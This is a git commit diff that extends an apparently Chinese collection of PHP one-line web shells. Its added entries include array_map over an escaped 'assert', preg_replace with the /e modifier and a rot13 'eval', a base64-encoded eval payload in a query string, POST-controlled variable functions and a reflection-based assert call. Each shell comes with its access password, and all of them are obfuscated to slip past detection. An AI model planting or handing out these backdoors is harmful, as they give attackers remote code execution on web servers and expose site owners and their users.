73515b79504882357cf2f3ad80314c96d1c12ce3
代码描绘人生 <XebZec@yeah.net>
2016-07-20 21:40:19 +0800

    Update PHP a word.php

--- php/PHP a word.php
+++ php/PHP a word.php
@@ -3,7 +3,13 @@
 @$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";                  
 @$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}                  
 [/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>
-//pass=-7
+//密码-7
+
+-----------------------------------
+<?php 
+array_map("ass\x65rt",(array)$_REQUEST['zhe']);?>
+?>
+//密码zhe
 
 -----------------------------------
 <?php
@@ -11,8 +17,59 @@ $item['wind'] = 'assert';
 $array[] = $item;
 $array[0]['wind']($_POST['xiaozhe']); 
 ?>
-//pass=xiaozhe
+//密码xiaozhe
 
 -----------------------------------
 <?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["#"]); ?>
-//pass=#
+//密码#
+
+-----------------------------------
+<?($b4dboy = $_POST['b4dboy']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add');?>
+//密码b4dboy
+
+-----------------------------------
+<?php  
+$a = $_REQUEST['id'];
+preg_replace('/.*/e',' '.$a,'');
+?>
+
+?id=eval%28base64_decode%28%22QGV2YWwoJF9QT1NUWydjJ10pOw%22%29%29; 密码c
+
+-----------------------------------
+<?php
+$p =& $_GET;array_map($p['call'],$p);
+?>
+//密码call
+
+-----------------------------------
+<?php $lang = (string)key($_POST);$lang($_POST['test']);?>
+
+//密码test
+-----------------------------------
+<?php $e = $_REQUEST['e'];$arr = array($_POST['settoken'],);array_map(base64_decode($e), $arr);?>
+
+//密码settoken
+
+-----------------------------------
+<?php  
+/**   
+* $a=$_POST[];  
+* assert  
+*/ 
+$a='';  
+class TestClass { }  
+$rc = new ReflectionClass('TestClass');  
+$str=$rc->getDocComment();  
+$pos=strpos($str,'$a');  
+$eval=substr($str,$pos,15);  
+$pos=strpos($str,'assert');  
+$fun=substr($str,$pos,6);  
+echo $eval;  
+$fun($eval);  
+echo $a;  
+$fun($a);  
+?> 
+//密码TestClass
+
+-----------------------------------
+
